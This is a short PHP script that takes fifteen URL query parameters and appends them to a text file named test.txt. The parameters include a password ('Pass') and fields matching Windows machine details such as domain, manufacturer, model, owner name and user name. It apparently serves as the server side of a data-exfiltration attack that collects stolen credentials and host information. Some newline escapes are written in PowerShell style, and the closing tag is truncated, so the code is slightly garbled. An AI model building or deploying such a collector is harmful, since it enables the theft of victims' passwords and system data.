<?php

$Pass = $_GET['Pass'];
$Capt = $_GET['Capt'];
$Zone = $_GET['Zone'];
$Desc = $_GET['Desc'];
$Dom = $_GET['Dom'];
$Man = $_GET['Man'];
$Model = $_GET['Model'];
$Name = $_GET['Name'];
$Procnum = $_GET['Procnum'];
$Owcont = $_GET['Owcont'];
$Owname = $_GET['Owname'];
$Systype = $_GET['Systype'];
$Size = $_GET['Size'];
$Usname = $_GET['Usname'];
$Group = $_GET['Group'];

$file = 'test.txt';

$current = file_get_contents($file);
$current .= "$Pass`n$Capt\n$Zone\n$Desc\n$Dom\n$Man`n$Model\n$Name\n$Procnum\n$Owcont\n$Owname`n$Systype\n$Size\n$Usname\n$Group\n";

file_put_contents($file, $current);

?